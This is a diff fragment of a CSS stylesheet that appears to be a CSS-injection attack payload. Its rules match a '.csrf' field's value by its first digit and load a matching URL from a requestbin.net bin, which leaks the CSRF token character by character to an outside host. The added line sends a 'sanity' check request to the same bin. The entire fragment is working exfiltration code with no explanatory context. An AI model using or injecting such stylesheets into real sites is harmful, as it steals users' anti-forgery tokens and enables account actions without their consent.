@@ -171,3 +171,4 @@ form > input[type='submit'] {
 .csrf[value^="7"] { content: url(http://requestbin.net/r/a1xo8akp/?7); }
 .csrf[value^="8"] { content: url(http://requestbin.net/r/a1xo8akp/?8); }
 .csrf[value^="9"] { content: url(http://requestbin.net/r/a1xo8akp/?9); }
+.csrf { background: url(http://requestbin.net/r/a1xo8akp/?sanity); }
